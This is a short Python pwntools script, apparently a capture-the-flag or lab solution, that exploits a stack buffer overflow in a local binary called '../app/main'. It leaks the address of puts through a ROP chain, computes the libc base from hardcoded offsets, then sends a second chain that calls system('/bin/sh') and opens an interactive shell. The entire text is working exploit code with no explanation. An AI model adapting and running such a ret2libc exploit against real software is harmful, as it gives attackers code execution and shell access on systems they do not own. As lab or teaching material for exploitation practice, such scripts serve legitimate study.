from pwn import *

pop_rdi = 0x000000000040114a
puts_got = 0x404000
puts_plt = 0x0000000000401030
main = 0x0000000000401170
binsh = 0x1a7e43
ret = 0x4011d8

p = process('../app/main')
#pause()
p.recvline()
p.sendline(b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
libc = int(p.recvline()[:-1][::-1].hex(), 16) - 0x7f760

system = libc + 0x528f0
binsh = libc + binsh

print(hex(libc))
p.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))

p.interactive()
